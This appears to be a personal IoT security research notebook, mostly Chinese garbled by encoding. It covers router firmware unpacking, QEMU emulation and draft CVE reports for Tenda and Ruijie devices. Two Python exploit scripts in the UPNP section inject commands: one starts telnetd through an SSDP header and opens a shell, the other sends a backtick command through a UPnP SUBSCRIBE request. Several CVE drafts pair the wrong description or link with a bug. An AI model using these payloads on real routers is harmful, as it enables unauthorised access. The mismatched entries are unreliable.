$reg = "/^(http(s?):\/\/){0,1}(?:[A-za-z0-9-]+\.)+[A-Za-z]{2,4}(?:[\/\?#][\/=\?%\-&~`@[\]\':+!\.#\w]*)?$/";
```


\* : è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­—ç¬¦é›†é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚
\+ : è¡¨ç¤ºé‡è¯ï¼ŒåŒ¹é…å‰è¾¹çš„å­—æ®µä¸€æ¬¡æˆ–å¤šæ¬¡
[] è¡¨ç¤ºå­—ç¬¦é›†
ï¼ˆï¼‰å°†æ•è·çš„ç»“æœä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰æ˜¯æ•è·ç»„çš„çœŸå®å«ä¹‰
%.   è¡¨ç¤ºåŒ¹é….   %ç”¨äºè¡¨ç¤ºç‰¹æ®Šå­—ç¬¦
^:  ä¸æ˜¯ï¼š éçš„æ„æ€
.* ï¼šåŒ¹é…ä»»æ„å­—ç¬¦





1. **å®šç•Œç¬¦**ï¼š

   - æ­£åˆ™è¡¨è¾¾å¼é€šå¸¸è¢«å®šç•Œç¬¦åŒ…å›´ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯æ­£æ–œçº¿ `/`ã€‚å®šç•Œç¬¦å¯ä»¥æ˜¯ä»»æ„éå­—æ¯æ•°å­—ã€éåæ–œçº¿ã€éç©ºç™½å­—ç¬¦ã€‚

2. **å¼€å§‹ (`^`) å’Œç»“æŸ (`$`) é”šç‚¹**ï¼š

   - `^` è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼åº”è¯¥ä»å­—ç¬¦ä¸²çš„å¼€å§‹å¤„å¼€å§‹åŒ¹é…ã€‚
   - `$` è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼åº”è¯¥åœ¨å­—ç¬¦ä¸²çš„ç»“å°¾å¤„ç»“æŸã€‚
   - è¿™ä¸¤ä¸ªç¬¦å·ç¡®ä¿æ•´ä¸ªå­—ç¬¦ä¸²å®Œå…¨ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ã€‚

3. **åè®®åŒ¹é…**ï¼š

   - `(http(s?):\/\/){0,1}` ç”¨äºåŒ¹é… URL çš„åè®®éƒ¨åˆ†ã€‚
   - `http` åé¢çš„ `(s?)` è¡¨ç¤º 's' å­—ç¬¦å¯æœ‰å¯æ— ï¼Œç”¨äºåŒ¹é… 'http' æˆ– 'https'ã€‚
   - `:\/\/` æ˜¯å¯¹å†’å·å’Œä¸¤ä¸ªæ­£æ–œçº¿çš„ç›´æ¥åŒ¹é…ã€‚
   - `{0,1}` è¡¨ç¤ºå‰é¢çš„æ•´ä¸ªæ¨¡å¼å¯ä»¥å‡ºç° 0 æ¬¡æˆ– 1 æ¬¡ã€‚

4. **åŸŸååŒ¹é…**ï¼š

   - `(?:[A-Za-z0-9-]+\.)+` åŒ¹é…åŸŸåã€‚
   - `[A-Za-z0-9-]+` åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯ã€æ•°å­—æˆ–è¿å­—ç¬¦ã€‚
   - `\.` åŒ¹é…ç‚¹å·ï¼ˆ`.`ï¼‰ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œç‚¹å·é€šå¸¸è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨åæ–œçº¿è½¬ä¹‰ã€‚
   - åé¢çš„ `+` è¡¨ç¤ºå‰é¢çš„æ¨¡å¼ï¼ˆå³ä¸€ä¸ªæ ‡ç­¾ï¼Œå¦‚ `example`ï¼‰å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚

5. **é¡¶çº§åŸŸååŒ¹é…**ï¼š

   - `[A-Za-z]{2,4}` åŒ¹é…é¡¶çº§åŸŸåï¼ˆå¦‚ `.com`ã€`.net`ï¼‰ã€‚
   - `{2,4}` è¡¨ç¤ºå‰é¢çš„å­—ç¬¦æ¨¡å¼è‡³å°‘å‡ºç° 2 æ¬¡ï¼Œæœ€å¤šå‡ºç° 4 æ¬¡ã€‚

6. **å¯é€‰çš„ URL éƒ¨åˆ†**ï¼š

   - `(?:[\/\?#][\/=\?%\-&~`@[]':+!.#\w]*)?` ç”¨äºåŒ¹é… URL çš„è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰å¯é€‰éƒ¨åˆ†ã€‚
   - `[\/\?#]` é¦–å…ˆåŒ¹é…ä¸€ä¸ªæ­£æ–œçº¿ã€é—®å·æˆ–äº•å·ã€‚
   - åé¢çš„éƒ¨åˆ† `[\/=\?%\-&~`@[]':+!.#\w]*` åŒ¹é… URL ä¸­å¯èƒ½å‡ºç°çš„å„ç§å­—ç¬¦ï¼ŒåŒ…æ‹¬æ–œçº¿ã€ç­‰å·ã€ç™¾åˆ†å·ã€è¿å­—ç¬¦ç­‰ã€‚
   - `*` è¡¨ç¤ºå‰é¢çš„æ¨¡å¼å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ŒåŒ…æ‹¬é›¶æ¬¡ã€‚
   - æœ€åçš„ `?` è¡¨ç¤ºè¿™æ•´ä¸ªéƒ¨åˆ†æ˜¯å¯é€‰çš„ã€‚

   

1. **åˆ†ç»„** (`()`):
   - åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œåœ†æ‹¬å·ç”¨äºåˆ›å»ºåˆ†ç»„ã€‚è¿™å…è®¸æ‚¨å°†å¤šä¸ªå­—ç¬¦æˆ–è¡¨è¾¾å¼ç»„åˆåœ¨ä¸€èµ·ï¼Œä»¥ä¾¿å¯¹æ•´ä¸ªç»„æ‰§è¡Œæ“ä½œï¼ˆå¦‚é‡å¤ã€åŒ¹é…ç­‰ï¼‰ã€‚
   - åˆ†ç»„è¿˜æœ‰ä¸€ä¸ªé™„åŠ åŠŸèƒ½ï¼šå®ƒä»¬å¯ä»¥æ•è·åŒ¹é…çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„å…¶ä½™éƒ¨åˆ†æˆ–è€…åœ¨æ›¿æ¢æ“ä½œä¸­å¼•ç”¨è¿™éƒ¨åˆ†åŒ¹é…çš„æ–‡æœ¬ã€‚
2. **éæ•è·åˆ†ç»„** (`(?:...)`):
   - æœ‰æ—¶å€™ï¼Œæ‚¨åªéœ€è¦åˆ†ç»„çš„ç»„åˆåŠŸèƒ½ï¼Œè€Œä¸éœ€è¦æ•è·åŠŸèƒ½ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨éæ•è·åˆ†ç»„ã€‚
   - åœ¨åˆ†ç»„çš„å¼€å§‹åŠ ä¸Š `?:`ï¼ˆç´§è·Ÿåœ¨å·¦åœ†æ‹¬å·åé¢ï¼‰æ¥åˆ›å»ºä¸€ä¸ªéæ•è·åˆ†ç»„ã€‚è¿™æ ·ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“å°±ä¸ä¼šä¿å­˜è¿™ä¸ªåˆ†ç»„åŒ¹é…çš„å†…å®¹ï¼Œä»è€ŒèŠ‚çœèµ„æºã€‚

åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ`\w` åŒ¹é…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸‹åˆ’çº¿ã€‚è¿™æ„å‘³ç€å®ƒåŒ¹é…æ‰€æœ‰çš„å°å†™å’Œå¤§å†™å­—æ¯ï¼ˆa-z, A-Zï¼‰ã€æ•°å­—ï¼ˆ0-9ï¼‰ä»¥åŠä¸‹åˆ’çº¿ï¼ˆ\_ï¼‰ã€‚


### UPNP

SSDP
SSDPä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„ç»„æ’­åœ°å€239.255.255.250å’ŒUDPç«¯å£å·1900æ¥ç›‘å¬å…¶ä»–è®¾å¤‡çš„è¯·æ±‚ã€‚
```http
M-SEARCH * HTTP/1.1
S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6
Host:192.168.1.254:1900
Man:"ssdp:discover"ST:ge:fridge
MX:3
```

```python
from socket import *
from os import *
from time import *
 
payload = b'M-SEARCH * HTTP/1.1\r\n'
payload += b'HOST:localhost:1900\r\n'
payload += b'ST:urn:device:;telnetd -p 8888\r\n\r\n'
 
s = socket(AF_INET, SOCK_DGRAM, 0)
s.sendto(payload, ("192.168.10.1", 1900))
s.close()
 
sleep(1)
system("telnet 192.168.10.1 8888")
```


```python
import socket
from time import sleep

def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')

```


## è·¯ç”±å™¨ä¸€ç¯®å­æµç¨‹+æ€»ç»“ğŸ„

###  å›ºä»¶è§£åŒ…

ddå‘½ä»¤
```shell
dd if=è¾“å…¥æ–‡ä»¶ of=è¾“å‡ºæ–‡ä»¶ bs=1 skip=xxx count=xxx

# bs=1 å³ä¸€å­—èŠ‚å¤§å°
# skipè·³è¿‡è¾“å…¥æ–‡ä»¶çš„å‰xxxä¸ªå—   1å— 1å­—èŠ‚

# countå¤åˆ¶å¤šå°‘ä¸ªå— å­—èŠ‚

# binwalkç¬¬ä¸€åˆ—æ˜¯å¼€å§‹çš„å­—èŠ‚æ•°

dd if=TL-AP1202C-PoE\ V1.0_1.0.5_Build_20201221_Rel.52389.bin of=F500.raw bs=1 skip=62720 count=854196


dd if=TL-AP1202C-PoE\ V1.0_1.0.5_Build_20201221_Rel.52389.bin of=400.raw bs=1 skip=1024 count=61696
```

#### Vxworkså›ºä»¶

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231220133415.png)

ubootå¤´ä¸­å¯èƒ½å¸¦æœ‰èµ·å§‹åœ°å€ï¼Œå¯ä»¥æå–å‡ºæ¥æœç´¢uimage
æˆ–è€…è®¾ç½®é»˜è®¤åŸºåœ°å€ä¸º0ï¼Œæ‰¾spå¯„å­˜å™¨èµ‹å€¼çš„å‚æ•°å³ä¸ºåŸºåœ°å€

å…¶ä¸­æœ€å¤§çš„sizeå°±æ˜¯è¿è¡Œç¨‹åºçš„éƒ¨åˆ†

```shell
binwalk -Y F500 # æŸ¥çœ‹æ¶æ„
```

æå–ç¬¦å·è¡¨

```shell
grep -r "bzero"
```

#### ä¸€èˆ¬å›ºä»¶

å‡½æ•°åå’Œå‡½æ•°åœ°å€(ç¬¦å·è¡¨)åœ¨bssæ®µçš„æƒ…å†µï¼Œä½¿ç”¨æ’ä»¶fix code



### å¯åŠ¨å›ºä»¶

ç»Ÿè®¡æ‰€æœ‰æ¥å£



å±é™©å‡½æ•°

```shell
os.execute, forkExec, io.popen
```

`[%w_-]+`: è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»æ¨¡å¼ã€‚

åœ¨ Lua ä¸­ï¼Œ`%w` åŒ¹é…æ‰€æœ‰å­—æ¯å’Œæ•°å­—ï¼Œ`_` åŒ¹é…ä¸‹åˆ’çº¿å­—ç¬¦ï¼Œ`-` åŒ¹é…è¿å­—ç¬¦ã€‚æ–¹æ‹¬å· `[]` åˆ›å»ºä¸€ä¸ªå­—ç¬¦é›†ï¼ŒåŒ¹é…é›†åˆä¸­çš„ä»»æ„å•ä¸ªå­—ç¬¦ã€‚åŠ å· `+` è¡¨ç¤ºåŒ¹é…å­—ç¬¦é›†ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚


qemuæ¨¡æ‹Ÿ

```shell
# ç”¨æˆ·çº§qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# ç³»ç»Ÿçº§qemuï¼ˆæ¡¥æ¥ï¼‰
# é…ç½®æœ¬æœºç½‘å¡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# å¯åŠ¨è™šæ‹Ÿæœº
./start.sh
# qemuå†…ç½‘ç»œé…ç½®
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-ä¸»æœº
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```

### åˆ†ææ€»ç»“

#### cgi

www/cgi-bin/ä¸‹å„ç§cgiåˆ†åˆ«ç®¡ç†å„ä¸ªåŠŸèƒ½ï¼Œæˆ–è€…ç”±ä¸€ä¸ªå¤§çš„cgibinç»Ÿåˆæ‰€æœ‰åŠŸèƒ½ç”¨è½¯é“¾æ¥çš„å½¢å¼

#### luci
æ˜¯ä¸€ä¸ªluaæ¡†æ¶ï¼Œä¸€èˆ¬åœ¨www/cgi-binä¸‹æœ‰ä¸€ä¸ªluciè„šæœ¬
usr/lib/lua/luci ç›®å½•ä¸‹æ˜¯å…¨éƒ¨çš„å‡½æ•°åŠŸèƒ½luaï¼Œcontrollerå°±æ˜¯ä¸»è¦çš„è·¯ç”±æ§åˆ¶å™¨

lua luciæ¡†æ¶æœç´¢è·¯ç”±

```shell
grep -Rs "entry({\"api"
grep -Rs "entry({"
```


#### nginx

è·¯ç”±ç”±é…ç½®æ–‡ä»¶å†³å®š

## CVEæäº¤æœ¬åœ°è¡¨å•

æäº¤å¹³å°ï¼šhttps://cveform.mitre.org/

ç®€å•æè¿°ï¼š
Tenda W30E V16.01.0.12(4843) was discovered to contain a stack overflow via the function formAdvancedSetListSet.

Tenda W30E V16.01.0.12(4843) was discovered to contain a command injection vulnerability via the function setUmountUSBPartition.



### AX12+AX9

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList feature, the list parameter is passed to sscanf without validation and then further passed to update_dev_name, it is concatenated with an SQL command in snprintf, leading to command injection.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In theÂ `/goform/SetNetControlList`Â function, theÂ `list`Â parameter is passed toÂ `sscanf`Â without validation and then further passed toÂ `add_tc_traffic_control`.Inside this function, command concatenation occurs inÂ `snprintf`.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-3.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In theÂ `/goform/SetOnlineDevName`Â feature, theÂ `mac`Â parameter is passed to theÂ `update_dev_name`Â function without validation. This parameter is concatenated with an SQL command inÂ `snprintf`, leading to a command injection vulnerability.

__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been found to contain a stack overflow vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList function, passing a value to the list parameter assigns it to v1. This then leads to a call to the sub_43FBBC function. Within this function, the strcpy function triggers a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetOnlineDevName.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'mac' parameter at /goform/SetOnlineDevName.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


### i29

v1.0 V1.0.0.5 and  v1.0 V1.0.0.2

1
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the lanCfgSet function, a stack overflow may occur when the value of parameter v8 is excessively large and is passed to the lanGw parameter in the strcpy function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/lanCfgSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function formAdvancedSetListSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the pingSet function, the concatenated command is stored in the v23 variable, and then it is passed to the cmd_get_ping_output function. Due to the lack of special character filtering, this could lead to command injection vulnerabilities.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/pingSet-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a command injection vulnerability via the function pingSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the pingSet function, a stack overflow may occur when the value of the pingIp parameter is excessively large and is passed to a stack variable using the strcpy function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/pingSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function pingSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the setPing function, a stack overflow may occur when the value of the ip parameter is excessively large and is passed to variable v19 using the sprintf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/setPing.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function setPing.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

5
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the spdtstConfigAndStart function, a stack overflow may occur when the value of the ip parameter is excessively large and is passed to variable v41 using the sprintf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/spdtstConfigAndStart.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function spdtstConfigAndStart

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


6
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysLogin function, after the validation of the username and password, the control flows into sub_414ECC. The value of the time parameter is passed to a stack variable using the sscanf function, potentially leading to a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysLogin.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysLogin

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

7
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the sysScheduleRebootSet function, the parameter v8 represents the value from rebootDate. The absence of special character filtering in v8, when concatenated into the parameters of the do_execute_cmd function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysScheduleRebootSet-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a command injection vulnerability via the function sysScheduleRebootSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

8
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysScheduleRebootSet function, the parameter v9 represents the value from rebootTime. If the length of v9 is excessively long, the memcpy function could result in a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysScheduleRebootSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysScheduleRebootSet

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

9
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysTimeInfoSet function, a stack overflow may occur when the value of the time parameter is passed to a stack variable using the sscanf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysTimeInfoSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysTimeInfoSet

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


10
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the wifiRadioSetIndoor function, a stack overflow may occur when the value of the bandwidth parameter is stored in v35 and then concatenated and passed to v39 using the sprintf function, especially when the value is excessively large.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/wifiRadioSetIndoor.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function wifiRadioSetIndoor

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


### WS6008

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
Ruijie
__Product__
WS6008
v1.x v2.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911

WS6108
v1.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the downFiles function in the file.lua, there is a lack of filtering and validation for params.list, allowing arbitrary characters to be input. This results in command concatenation, leading to the execution of arbitrary commands.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/WS6008-WS6108/1.md
__Suggested description of the vulnerability for use in the CVE__
Ruijie WS6008 v1.x v2.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911 and WS6108 v1.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911  was discovered to contain a command injection vulnerability via the function downFiles.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd



## è®¾å¤‡èµ„äº§æ”¶é›†

### dlink

DIR-830L

DIR-895L

DIR-890L

DIR-885L

DIR-880L

[DIR-850L](javascript:void(0);)

DIR-826L

DIR-820L

DIR-816L

DIR-810L





å‚è€ƒæ–‡ç« ï¼šhttps://mp.weixin.qq.com/s/9mmccpJVYOvib_af6DAOow





DIR-859

https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f







# æ¼æ´æŒ–æ˜è®°å½• â›ï¸

## cisco RV340(1.0.03.29 )

imgå›ºä»¶ï¼Œopenwrtå¼€å‘

7zipæå–ubié•œåƒï¼Œå°†å¾—åˆ°çš„ubiæ ¼å¼imgç”¨binwalkè¿›è¡Œè§£å‹

ä¾æ¬¡å¯åŠ¨nginxæœåŠ¡

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

## tenda w30e

ä¼¼ä¹å›ºä»¶å†…æ²¡æœ‰å®Œæ•´çš„webé¡µé¢æ–‡ä»¶ï¼Œæš‚ä¸”æç½®ğŸ˜¢



æ¼æ´ç‚¹åŠŸèƒ½ä¸€èˆ¬æ˜¯åœ¨httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemuå¯åŠ¨httpdç¨‹åºç›®ï¼Œå¹¶å¼€å¯è°ƒè¯•ç«¯å£
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#æŸ¥çœ‹å¯æ‰§è¡Œç¨‹åºéœ€è¦çš„åŠ¨æ€é“¾æ¥åº“
readelf -d ./bin/httpd | grep NEEDED
#åˆ—å‡ºæ‰€æœ‰çš„å‡½æ•°åï¼Œä¸è¦å¯»æ‰¾çš„å‡½æ•°å¯¹æ¯”
nm -D ./lib/libcommon.so

```

## tenda W20E(v15.11.0.6)

- qemu-arm-staticå¯ä»¥ç›´æ¥ä½¿ç”¨**, **é“¾æ¥`webroot_ro`åˆ°`/webroot`
- ç„¶åå‘ç°httpdæ— æ³•ç›‘å¬80ç«¯å£, æ˜¾ç¤ºg_lan_ip=0.
- IDAå’ŒæŸ¥çœ‹webroot_roå‘ç°default.cfgä¸­å­˜äº†g_lan_ip, ä¸ºéé›¶å€¼, GetValueå‡½æ•°è´Ÿè´£è¯»å–è¯¥æ–‡ä»¶. 
- è¿›åˆ°libcommon.so.0å‘ç°è¯¥å‡½æ•°å’Œcfmdè¿›ç¨‹é€šä¿¡è·å–çš„è¯¥æ•°å€¼, è€Œcfmdçš„å¯åŠ¨åˆéœ€è¦mtdè®¾å¤‡ç­‰ç­‰,  äºæ˜¯**è‡ªå·±å†™ä¸€ä¸ªGetValueå‡½æ•°è¿›è¡Œhook, ç›´æ¥ä½¿ç”¨æ–‡ä»¶è¯»å–**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- æŸ¥çœ‹`/lib`ä¸‹çš„libc, å‘ç°æ˜¯uClibc, ç¼–è¯‘å‚è€ƒ[è¿™é‡Œ](https://iotsec-zone.com/article?id=202#4ã€Netgear  R8300å›ºä»¶æ¨¡æ‹Ÿï¼ˆqemu-userï¼‰):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

